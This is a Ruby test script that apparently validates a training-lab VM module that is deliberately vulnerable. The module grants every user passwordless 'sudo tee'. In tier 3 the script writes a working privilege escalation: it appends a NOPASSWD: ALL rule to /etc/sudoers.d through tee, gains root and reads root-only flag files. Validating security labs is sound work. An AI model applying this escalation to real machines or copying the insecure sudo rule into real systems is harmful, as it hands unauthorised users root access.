require_relative '../../../../../lib/post_provision_test'


class SudoRootTeeTest < PostProvisionTest
  def initialize
    self.module_name = 'sudo_root_tee'
    self.module_path = get_module_path(__FILE__)
    super
  end

  def test_module
    super
    # Inputs: strings_to_leak and leaked_filenames are both checked below (flag file
    # present and root-only in tier 1, content readable via the sudo rule in tier 2).
    leaked = Array(self.json_inputs['leaked_filenames']).map(&:to_s).reject(&:empty?)
    strings = Array(self.json_inputs['strings_to_leak']).map(&:to_s)

    tier(1) do
      test_local_command('sudoers rule file root-owned 0440', "stat -c '%U:%G %a' /etc/sudoers.d/10_users_sudo_tee", 'root:root 440')
      test_local_command('sudoers rule allows tee as root with no password',
                         'cat /etc/sudoers.d/10_users_sudo_tee', 'ALL  ALL=(root) NOPASSWD: /bin/tee *, /usr/bin/tee *')
      test_local_command('sudoers rule allows sudo -l with no password',
                         'cat /etc/sudoers.d/10_users_sudo_list', 'ALL  ALL=(root) NOPASSWD: /usr/bin/sudo -l')
      # visudo -c prints "<file>: parsed OK" for each file it checks
      test_local_command('sudoers configuration parses', 'visudo -c 2>&1', 'parsed OK')

      leaked.each do |f|
        test_local_command("#{f} root-only in /root", "stat -c '%U:%G %a' #{Shellwords.escape("/root/#{f}")}", 'root:root 600')
      end
    end

    tier(2) do
      # what a student sees first: sudo -l shows the tee rule
      test_local_command('unprivileged user can list the tee sudo rule', 'sudo -n -l', '/usr/bin/tee *', user: 'nobody')
      # the misconfiguration: tee run through sudo writes as root. The unprivileged user writes a
      # probe file; ownership is then checked as root (nobody cannot stat inside /root, which is
      # 0700) and the probe removed so nothing is left behind.
      probe = '/root/.secgen_tee_probe'
      write = run_as_user('nobody', "echo probe | sudo -n /usr/bin/tee #{probe} >/dev/null")
      self.outputs.push write[:stderr] unless write[:stderr].to_s.empty?
      test_local_command('tee run via sudo by an unprivileged user wrote a root-owned file', "stat -c '%U' #{probe}", 'root')
      run_vagrant_ssh("rm -f #{probe}")
      # the flag itself stays unreadable to an unprivileged user
      leaked.each do |f|
        test_local_command("unprivileged user cannot read #{f} directly",
                           "cat #{Shellwords.escape("/root/#{f}")} 2>&1 || true", 'Permission denied', user: 'nobody')
      end
    end

    tier(3) do
      # GTFOBins (tee, sudo): because any user may run tee as root, a non-root
      # user can write any file as root. A throwaway, non-sudoer account writes
      # a sudoers drop-in granting itself full root through the `sudo tee` rule,
      # then uses it to run `id` as root (uid=0, so <privilege>root_rwx</privilege>
      # is satisfied) and to read the root-only flag. The drop-in is removed on
      # the way out and the account is deleted by with_throwaway_ssh_user.
      dropin = '/etc/sudoers.d/90_secgen_t3_tee'
      with_throwaway_ssh_user do |user, _pass|
        begin
          # the new account is genuinely unprivileged: it cannot read the flag yet
          leaked.each do |f|
            test_local_command("throwaway user #{user} cannot read #{f} before escalation",
                               "cat #{Shellwords.escape("/root/#{f}")} 2>&1 || true", 'Permission denied', user: user, tier: 3)
          end
          # write the sudoers drop-in through the vulnerable tee rule (runs as root)
          rule = "#{user} ALL=(ALL) NOPASSWD: ALL\n"
          w = run_as_user(user, "printf %s #{Shellwords.escape(rule)} | sudo -n /usr/bin/tee #{dropin} >/dev/null")
          self.outputs.push w[:stderr] unless w[:stderr].to_s.empty?
          # the drop-in now lets the account run anything as root: prove a root shell
          test_local_command('throwaway user escalates to root via the sudo tee misconfiguration (GTFOBins)',
                             'sudo -n id', 'uid=0(root)', user: user, tier: 3)
          # and read each root-only flag as root, matching the leaked content
          strings.each_with_index do |s, i|
            next if s.strip.empty?
            fname = leaked[i] || leaked.first
            next unless fname
            read_cmd = "sudo -n cat #{Shellwords.escape("/root/#{fname}")}"
            test_local_command("throwaway user reads root-only #{fname} after escalation",
                               read_cmd, s.strip.lines.first.to_s.strip, user: user, tier: 3)
          end
        ensure
          run_vagrant_ssh("rm -f #{dropin}")
        end
      end
    end
  end

end

SudoRootTeeTest.new.run
